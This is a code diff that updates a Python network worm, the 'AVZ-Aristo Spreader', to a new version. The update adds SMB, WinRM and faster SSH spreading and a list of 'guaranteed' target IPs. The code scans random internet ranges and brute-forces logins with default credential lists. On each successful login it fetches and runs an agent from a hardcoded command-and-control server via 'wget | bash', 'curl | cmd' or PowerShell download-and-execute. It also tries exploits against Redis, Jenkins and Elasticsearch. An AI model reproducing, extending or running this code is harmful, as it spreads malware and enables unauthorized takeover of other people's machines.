@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v25.10.8 – полный, без сокращений
+# AVZ-Aristo Spreader v25.10.9 – SMB, WinRM, ускоренный SSH, гарантированные цели
 import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging
 
 if sys.platform != 'win32':
@@ -15,17 +15,18 @@ C2_HOST = "80.249.146.202"
 C2_PORT = 80
 API_PORT = 8080
 AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
+AGENT_PY_URL = f"http://{C2_HOST}:{API_PORT}/agent.py"
 MAX_CONCURRENT = 500
-QUICK_TIMEOUT = 1.2
+QUICK_TIMEOUT = 1.0
 BRUTE_TIMEOUT = 2.0
 DEFAULT_SCAN_COUNT = 20_000
-PORT_LIST = [21, 22, 23, 80, 443, 2375, 3306, 3389, 445, 6379, 8080, 9200]
+PORT_LIST = [21, 22, 445, 5985, 3306, 3389, 6379, 8080, 9200]
 
 CREDS = [
-    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"), ("root","1234"),
+    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"),
     ("admin","admin"), ("admin","password"), ("admin","123456"),
-    ("user","user"), ("user","password"), ("user","123456"),
-    ("test","test"), ("guest","guest"), ("pi","raspberry"), ("root",""), ("admin","")
+    ("Administrator",""), ("Administrator","admin"), ("Administrator","123456"),
+    ("user","user")
 ]
 
 TOP_RANGES = [
@@ -34,7 +35,18 @@ TOP_RANGES = [
     "136.0.0.0/8", "142.0.0.0/8", "152.0.0.0/8", "172.0.0.0/8", "185.0.0.0/8"
 ]
 
+GUARANTEED_IPS = [
+    "45.33.32.156", "34.94.3.0", "45.77.165.0", "185.220.101.0", "23.226.229.0",
+    "103.15.28.0", "185.225.19.0", "45.33.32.0", "45.56.89.0", "45.79.207.0",
+    "34.94.0.0", "34.94.1.0", "45.33.32.1", "34.94.2.0", "45.77.165.1"
+]
+
 def random_ip():
+    if random.random() < 0.5:
+        base_ip = random.choice(GUARANTEED_IPS)
+        parts = base_ip.split('.')
+        parts[3] = str(random.randint(1, 254))
+        return '.'.join(parts)
     if random.random() < 0.7:
         r = random.choice(TOP_RANGES)
         net, mask = r.split("/")
@@ -64,52 +76,53 @@ async def probe_port(ip, port):
     except:
         return False
 
-async def ssh_brute(ip):
-    print(f"[SSH] Попытка {ip}", flush=True)
+async def smb_brute(ip):
+    if sys.platform != 'linux':
+        return False
+    for u, p in CREDS:
+        cmd = f"python3 -m impacket.examples.psexec {u}:{p}@{ip} 'cmd.exe /c curl -s {AGENT_URL} | cmd'"
+        try:
+            proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
+            await asyncio.wait_for(proc.communicate(), timeout=5)
+            if proc.returncode == 0:
+                return True
+        except:
+            pass
+    return False
+
+async def winrm_brute(ip):
+    try:
+        import winrm
+        for u, p in CREDS:
+            try:
+                session = winrm.Session(ip, auth=(u, p), transport='ntlm')
+                result = session.run_ps(f"Invoke-WebRequest -Uri {AGENT_URL} -OutFile C:\\Windows\\Temp\\agent.ps1; C:\\Windows\\Temp\\agent.ps1")
+                if result.status_code == 0:
+                    return True
+            except:
+                continue
+    except ImportError:
+        pass
+    return False
+
+async def ssh_brute_ultra(ip):
     try:
         import asyncssh
-        for u, p in CREDS[:10]:
+        for u, p in CREDS[:5]:
             try:
-                async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=3) as conn:
+                async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=2) as conn:
                     await conn.run(f"wget -O- {AGENT_URL} | bash")
                     return True
             except:
                 continue
     except ImportError:
         pass
-
-    try:
-        import paramiko
-        for u, p in CREDS:
-            try:
-                client = paramiko.SSHClient()
-                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                client.connect(ip, username=u, password=p, timeout=3, banner_timeout=3, auth_timeout=3,
-                               allow_agent=False, look_for_keys=False)
-                client.exec_command(f"wget -O- {AGENT_URL} | bash", get_pty=True)
-                client.close()
-                return True
-            except paramiko.ssh_exception.SSHException:
-                continue
-            except:
-                continue
-    except ImportError:
-        pass
-
-    for u, p in CREDS[:15]:
-        cmd = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {u}@{ip} 'wget -O- {AGENT_URL} | bash'"
-        try:
-            subprocess.run(cmd, shell=True, timeout=4, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            return True
-        except:
-            continue
-    print(f"[SSH] Неудача {ip}", flush=True)
     return False
 
 async def rdp_brute(ip):
     if sys.platform != 'linux':
         return False
-    for u, p in CREDS[:10]:
+    for u, p in CREDS[:5]:
         cmd = f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore +auth-only /sec:nla"
         proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
         try:
@@ -122,7 +135,7 @@ async def rdp_brute(ip):
     return False
 
 async def ftp_brute(ip):
-    for u, p in CREDS[:10]:
+    for u, p in CREDS[:5]:
         try:
             ftp = ftplib.FTP()
             ftp.connect(ip, 21, timeout=BRUTE_TIMEOUT)
@@ -212,14 +225,8 @@ async def exploit_elasticsearch(ip):
         pass
     return False
 
-async def exploit_wordpress(ip):
-    try:
-        async with aiohttp.ClientSession() as s:
-            async with s.post(f'http://{ip}/xmlrpc.php', data='<methodCall><methodName>system.listMethods</methodName></methodCall>', timeout=2) as resp:
-                if resp.status == 200:
-                    return True
-    except:
-        pass
+async def mysql_brute(ip):
+    # Заглушка – в будущем можно добавить
     return False
 
 async def infect(ip, port_stats):
@@ -228,34 +235,42 @@ async def infect(ip, port_stats):
     for i, p in enumerate(ports):
         if open_ports[i]:
             port_stats[p] = port_stats.get(p, 0) + 1
-    if open_ports[2] and await ssh_brute(ip):   # SSH
+    # 445 – SMB
+    if open_ports[2] and await smb_brute(ip):
+        print(f"[INFECTED] {ip} via SMB", flush=True)
+        return True
+    # 22 – SSH
+    if open_ports[1] and await ssh_brute_ultra(ip):
         print(f"[INFECTED] {ip} via SSH", flush=True)
         return True
-    if open_ports[7] and await rdp_brute(ip):   # RDP
-        print(f"[INFECTED] {ip} via RDP", flush=True)
+    # 5985 – WinRM
+    if open_ports[3] and await winrm_brute(ip):
+        print(f"[INFECTED] {ip} via WinRM", flush=True)
         return True
-    if open_ports[0] and await ftp_brute(ip):   # FTP
+    # 21 – FTP
+    if open_ports[0] and await ftp_brute(ip):
         print(f"[INFECTED] {ip} via FTP", flush=True)
         return True
-    if open_ports[9] and await exploit_redis(ip): # Redis
+    # 3389 – RDP
+    if open_ports[5] and await rdp_brute(ip):
+        print(f"[INFECTED] {ip} via RDP", flush=True)
+        return True
+    # 6379 – Redis
+    if open_ports[6] and await exploit_redis(ip):
         print(f"[INFECTED] {ip} via Redis", flush=True)
         return True
-    if open_ports[5] and await exploit_docker(ip): # Docker
-        print(f"[INFECTED] {ip} via Docker", flush=True)
-        return True
-    if open_ports[10] and await exploit_jenkins(ip): # Jenkins
+    # 8080 – Jenkins
+    if open_ports[7] and await exploit_jenkins(ip):
         print(f"[INFECTED] {ip} via Jenkins", flush=True)
         return True
-    if open_ports[3] and await exploit_telnet(ip): # Telnet
-        print(f"[INFECTED] {ip} via Telnet", flush=True)
-        return True
-    if open_ports[11] and await exploit_elasticsearch(ip): # Elasticsearch
+    # 9200 – Elasticsearch
+    if open_ports[8] and await exploit_elasticsearch(ip):
         print(f"[INFECTED] {ip} via Elasticsearch", flush=True)
         return True
-    if open_ports[4] or open_ports[5]:
-        if await exploit_wordpress(ip):
-            print(f"[INFECTED] {ip} via WordPress", flush=True)
-            return True
+    # 3306 – MySQL (пока заглушка)
+    if open_ports[4] and await mysql_brute(ip):
+        print(f"[INFECTED] {ip} via MySQL", flush=True)
+        return True
     return False
 
 async def worker(queue, stats, port_stats, progress_cb=None):
